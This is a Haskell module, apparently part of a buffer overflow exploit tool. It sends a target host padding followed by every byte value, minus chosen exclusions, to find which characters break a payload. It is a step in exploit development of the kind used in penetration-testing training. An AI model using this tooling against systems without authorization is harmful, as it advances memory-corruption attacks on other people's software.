module Overflow.BadChars
( sendBadChars
) where

import Overflow
import Data.Char       (chr)
import Data.Text       (Text, unpack)
import Data.List.Split
import Numeric

-- |...
sendBadChars :: Host -> Int -> Maybe Text -> Affix -> IO () 
sendBadChars h o e a = do
        putStrLn "    ───> Sending characters to target."
        sendPayload h payload >>= printResult 
    where
        payload = createPayload ((replicate o 'A') ++ characters e) a

-- ...
characters :: Maybe Text -> String
characters e = exclude (parseExclude e) $ map chr [1..255] 
    where
        exclude x s = filter (`notElem` x) s 

-- ...
parseExclude :: Maybe Text -> String
parseExclude  Nothing = ""
parseExclude (Just e) = map (chr . fst) bytes
    where
        bytes = concatMap readHex $ splitOn "," $ unpack e

-- ...
printResult :: Bool -> IO ()
printResult x
    | x         = putStrLn "Done! Finished sending characters to target."
    | otherwise = putStrLn "Error: An error occurred sending payload to target."
